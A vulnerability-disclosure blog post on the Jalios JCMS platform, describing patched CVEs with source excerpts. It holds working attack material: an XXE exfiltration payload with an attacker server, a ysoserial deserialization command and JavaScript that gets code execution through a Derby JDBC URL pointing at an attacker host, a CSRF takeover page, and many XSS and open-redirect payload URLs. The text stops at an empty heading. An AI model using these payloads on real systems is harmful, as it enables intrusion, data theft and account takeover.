---
author: "Vozec"
title: "Vulnerability Research on the Jalios CMS"
date: 2025-03-02
description: "This article presents various research findings on the Jalios CMS"
---

# Context

At the end of 2024, [Bizi](https://yeswehack.com/hunters/bizi) mentioned a French CMS that could be an interesting target for vulnerability research.  
We checked if they were interested in receiving vulnerability reports via the *security.txt* file on their main site:  
- https://www.jalios.com/.well-known/security.txt  

We decided to dive into the code to find as many bugs as possible. This article will present the technical workings of the "*JCMS*", the attack surface, and the various results we reported to the technical teams.

# Note 1/2
All the vulnerabilities presented below have now been patched. Additionally, this article is not intended to mock or point fingers at the Jalios development team. We thank them for their responsiveness and efficiency in fixing the various bugs. The team is attentive and aware of the importance of security flaws in their products. This article is purely educational.

# Note 2/2
The *JPlatform 10 SP6* application is not public; however, a version was published a few weeks ago on the CMS forum: [https://community.jalios.com/jcms/jc1_689181/fr/jplatform-10-sp6?cid=arw_78515](https://community.jalios.com/jcms/jc1_689181/fr/jplatform-10-sp6?cid=arw_78515). We were able to retrieve the .war file in version *10.0.6*.

It is important to note that some vulnerabilities were already fixed in the latest version of the CMS.  
We reported all our findings to the technical teams, and they informed us that some security patches had already been deployed for several months. We couldn't know this since access to the *forum* is restricted to JCMS clients.

# Installation
The CMS is easily installed on a Tomcat 9 or 10 server. Simply install the application via the Tomcat manager or extract the archive into the *webapps* folder of the server.

```bash
[/opt/tomcat]$ ls
bin  BUILDING.txt  conf  CONTRIBUTING.md  data  lib  LICENSE  logs  NOTICE  README.md  RELEASE-NOTES  RUNNING.txt  temp  webapps  work
[/opt/tomcat]$ ls webapps
docs  examples  host-manager  jalios  manager  ROOT
```

The Jalios instance is installed in the "jalios" folder. Thus, the root of the JCMS will be at `/jalios`.

# General Overview
The JPlatform application is presented as a collaborative space for businesses. The application is used to *"work, collaborate, and communicate with colleagues and partners, in the office"*. It includes an account and group system with privilege management, the ability to create articles, or upload documents. There is also a "*marketplace*" that offers additional modules to install.  
They are available on [community.jalios.com](https://community.jalios.com/jcms/kla_656504/fr/community-portail-application-jportal?portal=kla_656504&jsp=plugins%2FJXPlugin%2Fjsp%2Fapp%2Fjxplugin.jsp)

*More info on [the official website](https://jalios.com/)*  
![Main page](./img/1.png)

# Attack Surface
The application is coded in `Java` and combines compiled code in `.jar` libraries with `.jsp` pages (*"Java Server Pages"*).  
Here is the list of the main folders of the CMS:

```bash
[/opt/tomcat/webapps/jalios]$ ls -lha
total 116K
drwxr-xr-x 20 root root 4.0K Mar  2 21:10 .
drwxr-xr-x  9 root root 4.0K Mar  2 21:09 ..
drwxr-xr-x 13 root root  12K Jun 14  2022 admin
drwxr-xr-x  6 root root 4.0K Mar  2 21:12 css
drwxr-xr-x  5 root root 4.0K Jun 14  2022 custom
-rw-r--r--  1 root root 5.9K Jun 14  2022 display.jsp
drwxr-xr-x  7 root root 4.0K Jun 14  2022 docs
-rw-r--r--  1 root root 1.1K Jun 14  2022 edit.jsp
drwxr-xr-x  3 root root 4.0K Jun 14  2022 error
drwxr-xr-x  2 root root 4.0K Jun 14  2022 feed
drwxr-xr-x  4 root root 4.0K Jun 14  2022 flash
drwxr-xr-x  4 root root 4.0K Jun 14  2022 fonts
drwxr-xr-x 20 root root 4.0K Jun 14  2022 front
drwxr-xr-x 11 root root 4.0K Jun 14  2022 frontlib
drwxr-xr-x  5 root root 4.0K Jun 14  2022 images
-rw-r--r--  1 root root 1.1K Jun 14  2022 index.jsp
drwxr-xr-x 35 root root 4.0K Jun 14  2022 jcore
drwxr-xr-x  6 root root 4.0K Jun 14  2022 js
drwxr-xr-x  2 root root 4.0K Jun 14  2022 META-INF
-rw-r--r--  1 root root  422 Jun 14  2022 s.gif
drwxr-xr-x 63 root root 4.0K Jun 14  2022 types
drwxr-xr-x  2 root root 4.0K Mar  2 21:10 upload
drwxr-xr-x  9 root root 4.0K Mar  2 21:10 WEB-INF
drwxr-xr-x 12 root root  12K Jun 14  2022 work
```

We can segment the attack surface into several parts:
- The `/front` and `/work` folders. They correspond to pages accessible (mostly) by authenticated users with medium privileges.
- The `/jcore` folder, which contains *.jsp* pages to be included in various pages. These are components that rarely work independently. We will see that it is possible to call some components in a detoured manner.
- The `/admin` folder, which, as the name suggests, contains the entire administration section with configurations, user and group management.  
- The management of the *workspace* system and modules.
- The compiled part (*.jar*) contained in the `./WEB-INF/lib/` folder.  
  Here are the libraries specific to JCMS:
    - jaliosutil.jar
    - jcms.jar
    - jcmsopenapiclient.jar
    - jdring.jar
    - jspengine.jar
    - jstore.jar
    - jtaglib.jar  
(Most of the code is contained in `jcms.jar`.)  

- The modules installable from [community.jalios.com](https://community.jalios.com/jcms/jc1_455952/fr/module-petites-annonces-1-5-1)
- The rest: 
    - documentation
    - frontend & external libraries
    - ...

# Audited Surface
We focused on the *jsp* template system and therefore on the following folders:  
- `/jcore`
- `/work`
- `/front`
- `/admin`

The Java part will be covered in a future article!  

The template system is quite simple. The main files end with the `.jsp` extension, while the secondary files end with `.jspf`.  
These `.jspf` files are included in the `.jsp` files and are as modular as possible to be used in as many cases as possible. They are imported like in a classic templating system: `<%@ include file="/jcore/doInitPage.jspf" %>`  

In addition to this classic system, Jalios adds a layer with additional tags. The templates are therefore evaluated by the *jspengine.jar* engine, and then the custom tags are in turn evaluated to produce the final page.  

The format of the custom tags looks like this: `<jalios:modal css="<%= modalClasses %>" title="<%= confirmTitle %>">`.  
The *"class"* `com.jalios.jcms.taglib.ModalTag` is instantiated with the `css` and `title` parameters, themselves defined earlier in the jsp code:  

```java
<% 
String modalClasses = "modal-confirm"; 
String confirmTitle = getStringParameter("confirmTitle",""); 
%> 
... 
<jalios:modal css="<%= modalClasses %>" title="<%= confirmTitle %>"> 
  [.. snipped ..] 
</jalios:modal>
```

The application uses many functions in its templates to retrieve user parameters. However, they are all controlled by regexes, which prevents many injections:  
- getBooleanParameter
- getStringParameter
- getAttribute
- getDataParameter
- getDataIdParameter
- getAlphaNumParameter
- getIntParameter
- getGroupParameter
- getWorkspaceParameter
- ...

For each function, the application retrieves the user value and then attempts to cast it into the desired return type: int, bool, string, or even objects specific to Jalios: group, user, workspace...  

Only one function stands out: `getUntrustedStringParameter`.  
As its name suggests, it allows retrieving the raw content of the `GET` or `POST` parameter of the HTTP request. It is therefore important for finding different injection points.  

The application manages form handling in two parts. All requests requiring parameters are passed through `handlers`, coded in the Java libraries.  

The *JSP* templates form a `formHandler` object to define the request, response, and some parameters before generating the final page rendered to the user.  

**Example:**  
```java
%><jsp:useBean id="formHandler" scope="page" class="com.jalios.jcms.handler.TypeListEditorHandler"><% 
  %><jsp:setProperty name="formHandler" property="request" value="<%= request %>"/><% 
  %><jsp:setProperty name="formHandler" property="response" value="<%= response %>"/><% 
  %><jsp:setProperty name="formHandler" property="*" /><% 
  %><jsp:setProperty name="formHandler" property="noRedirect" value="true"/><% 
%></jsp:useBean><%
```

The previous example invokes the handler `com.jalios.jcms.handler.TypeListEditorHandler` by adding the `noRedirect` parameter set to `true`. When created, the `init()` method is called to define all the constants and execute all the initialization code. This is similar to the `__init__` method of a Python *class* or `__wakeup` of an object in PHP.

Subsequently, the jsp(f) template can call methods of the Java object, for example, to retrieve a value, calculate a redirect URL, or simply verify if the form action was successful.

```java
if (formHandler.validate()) { 
  request.setAttribute("modal.redirect", formHandler.getRedirect()); 
  %> 
  <%@ include file="/jcore/modal/modalRedirect.jspf" %><% 
} 
... 
```

The backend Java responses can also be stored in JSP variables to be used later in the template: 

```java
boolean isContentEditor = formHandler.isContentEditor(); 
boolean isFormEditor = formHandler.isFormEditor(); 
boolean isPortletEditor = formHandler.isPortletEditor(); 
boolean isUGCEditor = formHandler.isUGCEditor(); 

... 
<p class="text-center"> 
    <<% if (isFormEditor) { %> 
    <input type='hidden' name='formAuthorId' value='<%= channel.getDefaultAdmin().getId() %>'/> 
    <% } else if (isUGCEditor) { %> 
    <input type="hidden" name="ugc" value="true"/> 
    <% } %> 
</p> 
... 
```

# Presentation of the Admin Panel

The application has a default admin account: `admin:admin`.  
Here is the visual of the admin panel:  

![Admin panel](./img/2.png)

On the page */admin/properties/editor/propEditor.jsp*, it is possible to access the "Advanced Editing" mode and directly modify certain properties of the CMS:  

![alt text](./img/3.png)

The property `channel.security.csrf.enabled` is particularly interesting because it allows disabling CSRF token verification, thus opening the door to new exploitation techniques. We will see later that disabling this parameter is common in Jalios instances, so this scenario is not purely theoretical.

# tl;dr of vulnerabilities founds

Here are the vulnerabilities we have discovered *(some of which require incorrect configuration)* :
- XSS (reflected/stored/...) - **CVE-2025-25035**
- Open Redirect - **CVE-2025-25034**
- Cross-Site Request Forgery (CSRF) Account Takeover - **CVE-2025-25038** *(misconfiguration required)*
- SQL Injection - **CVE-2025-0942**
- An XXE injection - **CVE-2025-25036**
- Remote Code Execution - **CVE-2025-25037**
- Some information disclosures.

We will present the unique vulnerabilities first, then focus on the XSS and OpenRedirects, which are present in many places.

# XML External Entity Injection (XXE)

The first vulnerability is found in the file `/admin/importManager.jsp`. It is possible to upload an XML file and trigger an XXE attack. By importing an external entity, it is possible to make requests from the server (SSRF) or exfiltrate files. External entities are enabled in the class `jalios.util.XmlUtil.class`.

Without restrictions on loading external entities, it is possible to load one from a malicious file and exfiltrate the content. It is also possible to perform a blind-XXE with the *.dtd* files already present on the server.  

*Reading the file /tmp/poc.txt*
```xml
<?xml version="1.0" ?> 
<!DOCTYPE message [ 
    <!ENTITY % ext SYSTEM "http://127.0.0.1:5000/payload"> 
    %ext; 
]>
```

*Attacker's Python application*
```python
from flask import Flask, request 

app = Flask(__name__) 
me = 'http://127.0.0.1:5000' 

@app.route('/payload', methods=['GET']) 
def payload(): 
    payload = f''' 
<!ENTITY % file SYSTEM "file:///tmp/poc.txt"> 
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM '{me}/out?data=%file;'>"> 
%eval; 
%exfiltrate; 
''' 
    return payload, 200 

@app.route('/out', methods=['GET']) 
def exfiltrate(): 
    data = request.args.get('data') 
    print("#"*50) 
    print(data, flush=True) 
    print("#"*50) 
    return "Data received", 200 

if __name__ == '__main__': 
    app.run(debug=True)
```

*jspengine\compiler\ParserXJspSax.java*:
```java
public void parse() throws JasperException { 
        String str; 
        try { 
            XMLReader xMLReader = SAXParserFactory.newInstance().newSAXParser().getXMLReader(); 
            DefaultHandler parserXJspSaxHandler = new ParserXJspSaxHandler(this.filePath, this.jspHandler); 
            xMLReader.setContentHandler(parserXJspSaxHandler); 
            xMLReader.setEntityResolver(parserXJspSaxHandler); 
            xMLReader.setDTDHandler(parserXJspSaxHandler); 
            xMLReader.setErrorHandler(parserXJspSaxHandler); 
            for (int i = 0; i < lexicalHandlerPropNames.length && !setSaxProperty(xMLReader, parserXJspSaxHandler, lexicalHandlerPropNames[i]); i++) { 
            } 
            try { 
                xMLReader.setFeature("http://xml.org/sax/features/validation", false); 
                xMLReader.setFeature("http://xml.org/sax/features/namespaces", false); 
                xMLReader.setFeature("http://xml.org/sax/features/namespace-prefixes", true); 
                xMLReader.parse(this.is); 
            } catch (SAXNotRecognizedException e) { 
                throw new JasperException(Constants.getString("jsp.parser.sax.featurenotrecognized", new Object[]{e.getMessage()})); 
            } catch (SAXNotSupportedException e2) { 
                throw new JasperException(Constants.getString("jsp.parser.sax.featurenotsupported", new Object[]{e2.getMessage()})); 
            } 
        } catch (IOException e3) { 
            [.. SNIPPED ..] 
        } 
    }
```

Additionally, the class `jalios.jcms.context.AbstractJcmsAjaxContext.class` seems very interesting, as it contains similar parsing code for an HTTP header:  

```java
public void inflate(String str, HttpServletRequest httpServletRequest) { 
    try { 
        str = IOUtil.base64DecodeAndInflateString(str); 
    } catch (Exception e) { 
        logger.warn(e.getMessage(), e); 
    } 
    Map<String, Object> emptyMap = Collections.emptyMap(); 
    try { 
        newSecureSAXParserFactory().newSAXParser().parse(new ByteArrayInputStream(str.getBytes()), new AjaxDeflateSAXEventHandler()); 
        XMLDecoder xMLDecoder = new XMLDecoder(new ByteArrayInputStream(str.getBytes())); 
        emptyMap = (Map) xMLDecoder.readObject(); 
        if (xMLDecoder != null) { 
            if (0 != 0) { 
                xMLDecoder.close(); 
            } else { 
                xMLDecoder.close(); 
            } 
        } 
    } catch (IOException | ParserConfigurationException | SAXException e2) { 
        logger.debug("Invalid Ajax deflate header received", e2); 
    } 
    if (emptyMap != null) { 
        readObject(emptyMap, httpServletRequest); 
    } 
}
```

The header `X-Jcms-Ajax-Deflate` is decoded in base64 and then decompressed with Zlib Inflate before being parsed by an `XMLDecoder`. We can test this behavior with a fictional page: 
```java
<% request.setAttribute("CheckCSRF", Boolean.TRUE); %> 
<%@ include file="/jcore/doInitPage.jspf" %> 
<% String currentUserLang = channel.getCurrentUserLang(); %> 
<%= currentUserLang %>
```

The [Hackvector](https://portswigger.net/bappstore/65033cbd2c344fbabe57ac060b5dd100s) extension allows me to quickly test payloads by encoding my XML payload correctly.

![XXE payload test](./img/4.png)  

By digging a little deeper, we realize that it is possible to instantiate any Java class!  
In theory, it is possible to execute code using `Runtime.getRuntime().exec()`.  

`XMLDecoder` is actually the parsing function of Java Beans, and the exploitation is documented [here](https://github.com/mgeeky/Penetration-Testing-Tools/blob/master/web/java-XMLDecoder-RCE.md#java-beans-xmldecoder-remote-code-execution-cheatsheet).  

Unfortunately, by digging further, we realize that the exploitation fails due to `newSecureSAXParserFactory().newSAXParser().parse`, which throws an exception if an entity is defined or if a class other than `Hashmap` or `String` is instantiated. Too bad, as it was *almost* a pre-auth RCE!

# Information Leak
It is possible to retrieve certain information about the CMS, although some configurations are sometimes necessary.

- `/admin/exportXml.jsp` allows leaking information contained in the DB (users, articles, ...) if the parameter `export-mgr.xml-export.require-logged-member` is set to *false*.
    - Example: */admin/exportXml.jsp?text=HELLO&searchInDB=true&searchInMembers=true&searchInFiles=true*

- `/docs/javadoc/index.html` allows leaking the CMS version via the documentation:  
![version leak](./img/5.png)

- `*jcore/field/control/sqlquery.jsp*` allows leaking the names of the different `jdbc` connected to the Tomcat application.
This last endpoint is particularly interesting as it allows full exploitation with the following vulnerability.

*/jcore/field/control/sqlquery.jsp*:
```java
<% 
    for (Iterator<String> it = DBUtil.getDataSourceMap().keySet().iterator(); it.hasNext();) { 
    String itDataSource = it.next(); 
    String selected = itDataSource.equals(dataSource) ? " selected='selected'" : "";
    %><option value="<%= itDataSource %>"<%= selected %>><%= channel.getDataSourceLabel(itDataSource, userLang) %></option><% 
    } 
%>
```

# SQL Injection (SQLi)

The file `/work/dbrecordChooser.jsp` is vulnerable to an unauthenticated SQL injection on the `jdbc` attached to the application.  
However, it is necessary to specify the jdbc to use, which is why the previous *sqlquery.jsp* file is very useful.

*/work/dbrecordChooser.jsp*  
```java
String dataSourceStr = getUntrustedStringParameter("ds", null); 
DataSource dataSource = DBUtil.getDataSource(dataSourceStr); 
if (dataSource == null) { 
  return; 
}
```

The parameters `table`, `columns`, `orderBy`, `keyCol` and `labelCol` are vulnerable to the following SQL injection: 

```java
String table = getUntrustedStringParameter("table", null); 
String columns =  getUntrustedStringParameter("columns", "*"); 
String keyCol = getUntrustedStringParameter("keyCol", null); 
String labelCol = getUntrustedStringParameter("labelCol", null); 
String orderBy = getUntrustedStringParameter("orderBy", null); 
int maxRows = getIntParameter("maxRows", 100); 

if(!columns.equals("*")) { 
  if(labelCol != null && !columns.contains(labelCol)) { 
    columns = labelCol + "," + columns; 
  } 
  if(keyCol != null && !columns.contains(keyCol)) { 
    columns = keyCol + "," + columns; 
  } 
} 

String sqlQuery = "select " + columns + " from " + table + (Util.notEmpty(orderBy) ? " ORDER BY " + orderBy : ""); 
[.. SNIPPED ..] 
<jalios:sqlquery name="sqr" dataSource="<%= dataSourceStr %>" query="<%= sqlQuery %>" maxRows="<%= maxRows %>" />
```

The `sqlquery` tag directly executes the SQL command, and the result is displayed below.

![SQLI MySQL jdbc](./img/6.png)

# Remote Code Execution (RCE)

A remote code execution is possible through a JDBC injection. Indeed, it is possible to abuse the `readMessage` method, which deserializes an object controlled by the attacker, as described in the following article: [https://su18.org/post/jdbc-connection-url-attack/](https://su18.org/post/jdbc-connection-url-attack/)

- */admin/properties/ajaxJDBC.jsp*:  
```java
String msg = com.jalios.jcms.ajax.JcmsJSONUtil.checkJDBCConnection( 
  getUntrustedStringParameter("db_jcmsdb",""),  
  getUntrustedStringParameter("db_url",""),  
  getUntrustedStringParameter("db_username",""),   
  getUntrustedStringParameter("db_password","") 
);
```

- *jcms.JcmsUtil.class*:  
```java
public static void checkJDBCConnection(String str, String str2, String str3, String str4) throws Exception { 
  channel.getClass(str); 
  Connection connection = DriverManager.getConnection(str2, str3, str4); 
  if (connection != null) { 
      connection.close(); 
  } 
}
```

It is possible to host a fake Derby server using [this tool](https://github.com/4ra1n/mysql-fake-server) or even create a TCP server with Python. The payload is sent in raw bytes during a connection on port 36071.

![RCE Derby](./img/7.png)

By looking at the versions of the libraries used, we noticed that the `rome.jar` library was in version `1.0`. After a quick search, we realized that this library is [vulnerable to a Java deserialization chain](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/Java.md#ysoserial), allowing arbitrary code execution!  
The payload can be generated with [Ysoserial](https://github.com/frohoff/ysoserial): 
```bash
java -jar ysoserial-all.jar ROME "touch /tmp/hacked" | base64 -w 0
```

The exploitation occurs in 2 requests:
- One to create a "Database" object, specific to Jalios.
- One to connect to the database.

Here is a JavaScript code to trigger the code execution from an XSS vulnerability, for example: 
```javascript
async function RCE_v1(host, port) { 
  const headers = new Headers(); 
  headers.append("X-Requested-With", "XMLHttpRequest"); 
  let id = (Math.random() + 1).toString(36).substring(7); 
  const urls = [ 
    `/admin/properties/ajaxJDBC.jsp?db_jcmsdb=derby-remote&db_url=jdbc:derby:${id};create=true&db_username=&db_password=`, 
    `/admin/properties/ajaxJDBC.jsp?db_jcmsdb=derby-remote&db_url=jdbc:derby:${id};startMaster=true;slaveHost=${host};slavePort=${port};&db_username=&db_password=` 
  ]; 
  for (const url of urls) { 
    try { 
      const response = await fetch(url, { 
        method: 'GET', 
        headers: headers 
      }); 
      const result = await response.text(); 
      console.log(result); 
    } catch (error) { 
      console.error('Error:', error); 
    } 
  } 
} 

RCE_v1("<ip>", 36071)
```

Additionally, the frontend exposes a JS API that allows easier interaction with the backend. It is thus possible to perform the two requests in this way: 

```javascript
function RCE_v2(host, port){ 
    let id = (Math.random() + 1).toString(36).substring(7); 
    JcmsJsContext.getJsonRPC().JcmsJSONUtil.checkJDBCConnection("derby-remote",`jdbc:derby:${id};create=true`,"",""); 
    JcmsJsContext.getJsonRPC().JcmsJSONUtil.checkJDBCConnection("derby-remote",`jdbc:derby:${id};startMaster=true;slaveHost=${host};slavePort=${port};`,"",""); 
} 

RCE_v2("<ip>", 36071)
```

These two codes can be hosted on an attacker's server and then imported during an XSS, which drastically increases the severity of the vulnerability.

# Cross-Site Request Forgery (CSRF)
In the absence of CSRF token verification (*channel.security.csrf.enabled*), it is possible to take control of a user account with a single click via a CSRF attack. Although security must be disabled, the user's password should be required to modify the victim's email.  

Here is the verification function executed before modifying user information (*jcms.handler.EditMemberHandler.class*):  
```java
protected boolean validateUpdate() throws IOException { 
        if (!this.opUpdate) { 
            return false; 
        } 
        if (this.memberAlertSettingsHandler != null) { 
            this.memberAlertSettingsHandler.setOpUpdate(String.valueOf(Boolean.TRUE)); 
        } 
        if (!validateCommonUpdate()) { 
            return false; 
        } 
        this.workingMember = (Member) this.member.getUpdateInstance(); 
        setFields(this.workingMember); 
        if (!processStatus(this.workingMember.checkUpdate(this.loggedMember, getControllerContext()))) { 
            return false; 
        } 
        return true; 
    }
```

The following request modifies the victim's email, so an attacker can specify their email and use the password reset function to take control of the account.  

```html
<html> 
  <body> 
    <script> 
      f = document.createElement("form") 
      f.method = 'POST' 
      f.enctype="multipart/form-data" 
      f.action="http://172.22.12.128:8001/jalios/front/editProfile.jsp" 
      const fields = [ 
        { name: "email", value: "malicious@evil.com" }, 
        { name: "opUpdateProfile", value: "Enregistrer" } 
      ]; 
      fields.forEach(field => { 
        const input = document.createElement("input"); 
        input.type = "hidden"; 
        input.name = field.name; 
        input.value = field.value; 
        form.appendChild(input); 
      }); 
      document.body.appendChild(f); 
      f.submit(); 
    </script> 
  </body> 
</html>
```

Additionally, like most Java-based CMS, it is possible to pass parameters in the URL to form the following URL: 
- `/front/editProfile.jsp?email=malicious@evil.com&emailVisible=true&opUpdateProfile=Enregistrer`

# Open Redirects (OpenRedirect)
A large number of OpenRedirects were found in the JCMS application. Unfortunately, they were already known to the Jalios development team.  
Many are backend-related, while some abuse a reflected parameter in JavaScript. Later, we will see that some client-side OpenRedirects are actually vulnerable to XSS.

The following code formats were identified multiple times in the JSP files: 

```java
String redirectUrl = Util.getString(getValidHttpUrl("redirect"), (restartAsked ? "admin/admin.jsp" : "")); 
[.. SNIPPED ..] 
JcmsJspContext.sendRedirect(redirectUrl, request, response);
```

```java
String redirect = Util.getString(getValidHttpUrl("redirect"), ServletUtil.getBaseUrl(request) + "index.jsp"); 
if (isLogged) { 
  sendRedirect(redirect); 
  return; 
}
```

```java
String redirect = getValidHttpUrl("redirect"); 
sendRedirect(redirect);
```

```java
if (hasParameter("opChange") && ws != null) { 
  [.. SNIPPED ..] 
  String redirectUrl = urlWorkAreaUpdate != null ? urlWorkAreaUpdate + "ws=" + ws.getId() : null; 
  if (getBooleanParameter("modal", true)) { 
    request.setAttribute("modal.redirect", redirectUrl); 
  } else { 
    sendRedirect(redirectUrl); 
  } 
  [.. SNIPPED ..] 
}    
```

```java
sendRedirect(getUntrustedStringParameter("redirect", "admin/admin.jsp"), request, response);
```

Here are all the identified OpenRedirects, some require being logged in or being an administrator:

### Pre-Auth
- `/front/notAvailable.jsp?redirect=////google.fr`
- `/front/memberpreference/savePreference.jsp?redirect=////google.com`
- `/front/logout.jsp?redirect=////google.com`
- `/work/workspace/workspaceLinkModal.jsp?urlWorkAreaUpdate=////google.com?&ws=j_4&opChange=1&modal=false`
- `/admin/showTargets.jsp?redirect=////google.com`
- `/jcore/closePopup.jsp?redirectNoClose=////google.com`
- `/jcore/closePopup.jsp?redirect=////google.com` *(Redirect on opener)*

## Auth
- `/front/follow.jsp?id=c_5000&opFollow=true&redirect=////google.com` *(PreAuth sometime)*
- `/front/privateLogin.jsp?redirect=////google.fr`
- `/jcms/?jsp=front%2Flogin.jsp&portal=j_206&csrftoken=1&cookieExpected=true&redirect=////google.fr`
- `/jcore/notification/editNotificationCriteria.jsp?opFinish=true&redirect=////google.com `
- `/jcore/member/toggleFavoriteWorkspace.jsp?opRemove=true&redirect=////google.com`
- `/jcore/member/toggleFavoriteWorkspace.jsp?opAdd=true&redirect=////google.com`

## Admin
- `/work/sendWFReminder.jsp?id=1&redirect=////google.com`
- `/admin/fileprocessor/reprocess.jsp?opCleanAndReprocess=true&redirect=////google.com`
- `/edit.jsp?opLock=true&id=c_5001&redirect=////google.com`
- `/types/Shortcut/editShortcut.jsp?opUpdate=true&id=c_5034&pstatus=0&redirect=////google.com`
- `/types/Shortcut/FileDocument.jsp?opUpdate=true&id=c_5042&pstatus=0&redirect=////google.com`
- `/types/Media/editMedia.jsp?id=753665_Media&opUpdate=true&pstatus=0&redirect=////google.com`

The following code is responsible for defining the `redirect` attribute for the form: 
```java
public String getRedirect() { 
    return this.redirect; 
} 

public void setRedirect(String str) { 
    this.redirect = HttpUtil.validateHttpUrl(str); 
    if (str != null && this.redirect == null) { 
        JcmsUtil.logSecurityIssue(logger, "Invalid 'redirect' URL parameter : '" + str + "'. Update configuration if URL should be authorized (see javadoc for HttpUtil.isValidHttpUrl())."); 
    } 
}
```

The `isValidHttpUrl` function is called to verify if the redirect parameter is valid.  
```java
public static String validateHttpUrl(String str) { 
  if (isValidHttpUrl(str)) { 
      return str; 
  } 
  return null; 
} 

public static boolean isValidHttpUrl(String str) { 
    [.. SNIPPED ..] 

    } else if (!isValidAgainstRegex("Http Url", "channel.security.Validator.JCMSRedirectURL", str)) { 
        logger.trace("[isValidHttpUrl] Done. Invalid URL : value does not match 'JCMSRedirectURL'."); 
        return false; 
    } else { 
        if (!URLUtils.isAbsoluteUrl(str)) { 
            logger.trace("[isValidHttpUrl] Done. Valid URL : relative URL value are always accepted."); 
            return true; 
        } 
        [.. SNIPPED ..] 
    } 
}
```

The default `channel.security.Validator.JCMSRedirectURL` regex is as follows: `^(?!(\/\\)|javascript:|(https?:((\\\\)|(\/\\)|(\\\/))))[^\n\r]*$`.  

It allows the use of `////`, which allows redirecting to `////google.com`.  
Additionally, we will see later that it is possible to bypass the verification to redirect to the `javascript:` protocol and perform an XSS!  

# Cross-Site Scripting (XSS)

Similarly, many XSS vulnerabilities were reported.  
Some require the `channel.security.csrf.enabled` parameter to be disabled to access certain files.  
The main vulnerable code uses a string from the `getUntrustedStringParameter` function mentioned earlier.  
Also, the `getRedirect` method of form handlers is mostly vulnerable because it does not sanitize the `redirect` field. This method is often called to populate an `<input>` tag: 

```html
<input type='hidden' name='redirect' value='<%= formHandler.getRedirect() %>' />
```

## Reflected XSS

### Pre-Auth
- `/work/dbrecordChooser.jsp?ds=jdbc/opcvm&targetUrl=%3C%2Fscript%3E%3Cimg%2Fsrc%2Fonerror%3Dalert%281%29%3E (*Should have valid jdbc*)`
- `/work/popupImportCatList.jsp?redirect=a'><img/src/onerror=alert(1)>`
- `/work/popupImportCatList.jsp?pid=a'><img/src/onerror=alert(1)>`
- `/work/workspace/editWorkspaceInstanceWorkflow.jsp?typeName=generated.Article&wsId=j_4'"><img/src/onerror=alert(1)>`
- `/work/pdfUploadModal.jsp?redirect=</script><img/src/onerror=alert(1)>`
- `/work/pdfUploadModal.jsp?redirect="-alert()-"`

### Pre-Auth + *channel.security.csrf.enabled = false*
- `/jcore/modal/warning.jsp?msg=<img/src/onerror=alert(1)>`
- `/jcore/modal/prompt.jsp?msg=<img/src/onerror=alert(1)>`
- `/jcore/modal/confirm.jsp?msg=<img/src/onerror=alert(1)>`
- `/jcore/modal/confirm.jsp?confirmTitle=<img/src/onerror=alert(1)>`
- `/jcore/modal/iframe.jsp?url="></iframe><img/src/onerror=alert(1)>`
- `/jcore/modal/alert.jsp?msg=<img/src/onerror=alert(1)>`
- `/work/wysiwygPreview.jsp?targetInputId=wysiwygConfigurationSample&html=%3Ca%20href%3DJa%26Tab%3Bvascript%26colon%3Balert%28%29%3ECLICK%20HERE`

### Auth
- `/jcore/pubchooser/pubChooserItems.jsp?itemAction="><img/src/onerror=alert(1)>`
- `/work/chooser/memberChooser.jsp?&targetUrl=%27%7D%3B%3C%2Fscript%3E%3Cimg%2Fsrc%2Fonerror%3Dalert%281%29%3E`
- `/work/caddy/caddyPopin.jsp?elmIds=1&1cadQueryString=A&1cadCss="><img/src/onerror=alert(1)>`
- `/work/caddy/caddyPopin.jsp?elmIds=1&1cadQueryString=A&1cadIcon="><img/src/onerror=alert(1)>`

### Admin
- `/work/mergeDocument.jsp?redirect=%22%3E%3Cimg%2Fsrc%2Fonerror%3Dalert%28%29%3E&srcDoc=c_5010` *(srcDoc should be a valid document id)*
- `/work/mergeCategory.jsp?redirect=%22%3E%3Cimg%2Fsrc%2Fonerror%3Dalert%28%29%3E&srcCat=j_5` *(srcCat should be a valid category id)*
- `/work/editCat.jsp?redirect='><img/src/onerror=alert(1)>`
- `/work/workspace/editWorkspace.jsp?redirect='><img/src/onerror=alert(1)>`
- `/work/workspace/editWSTypeEntry.jsp?typeName=generated.Article&redirect='><img/src/onerror=alert(1)>`
- `/work/workspace/editWorkspaceType.jsp?quotaUnit='><img/src/onerror=alert(1)>`
- `/work/workspace/editWorkspaceType.jsp?quotaValue='><img/src/onerror=alert(1)>`
- `/work/caddy/publicationCaddyManager.jsp?redirect='><img/src/onerror=alert(1)>`
- `/admin/mail/adminMail.jsp?redirect='><img/src/onerror=alert(1)>`
- `/admin/mail/adminMailOpen.jsp?redirect='><img/src/onerror=alert(1)>`
- `/admin/editMember.jsp?redirect='><img/src/onerror=alert(1)>`
- `/admin/editAcl.jsp?redirect='><img/src/onerror=alert(1)>`
- `/admin/editGroup.jsp?redirect='><img/src/onerror=alert(1)>`
- `/admin/portalProfiler.jsp?name='><img/src/onerror=alert(1)>`
- `/admin/wfEditor.jsp?id="><img/src/onerror=alert(1)>`
- `/admin/fileprocessor/adminFileProcessor.jsp?actionComponent="><img/src/onerror=alert(1)>`
- `/admin/fileprocessor/adminFileProcessor.jsp?status="><img/src/onerror=alert(1)>`
- `/admin/jsync/jsync.jsp?leaderUrl="'><img/src/onerror=alert(1)>` *(JSync feature enabled)*
- `/admin/mail/adminMailOpen.jsp?fromEmail="'><img/src/onerror=alert(1)>` *(SMTP setup & Mails enabled)*
- `/admin/mail/workspaceMail.jsp?redirect='><img/src/onerror=alert(1)>` *(SMTP setup & Mails enabled)*

## WYSIWYG Filter Bypass
The page `/work/wysiwygPreview.jsp` allows for a safe preview of an HTML page using the `html` parameter. However, the following conditions must be met:
- **channel.security.wysiwyg-preview-enabled == true** *(default)*
- **channel.security.csrf.enabled == false** *(non-default)*  

```java
String html = getUntrustedStringParameter("html", null);
html = WysiwygManager.cleanHtml(html, WysiwygManager.getCleanHtmlContextMap(null, "wysiwyg-preview"));
...
<jalios:wysiwyg><%= html %></jalios:wysiwyg>
```

Most HTML attributes are stripped, making it seem difficult to bypass this filter. However, the `href` attribute is allowed as long as it does not start with `javascript:`.  
A possible bypass is to use `&Tab;` in the middle of `javascript` and `&colon;` to replace `:`. The following XSS requires clicking on the malicious `<a>` tag:

- *?html=%3Ca%20href%3DJa%26Tab%3Bvascript%26colon%3Balert%28%29%3ECLICK%20HERE*
```html
<a href=Ja&Tab;vascript&colon;alert()>CLICK HERE
```

![bypass cleanHtml](./img/16.png)

## XSS Post + CSRF
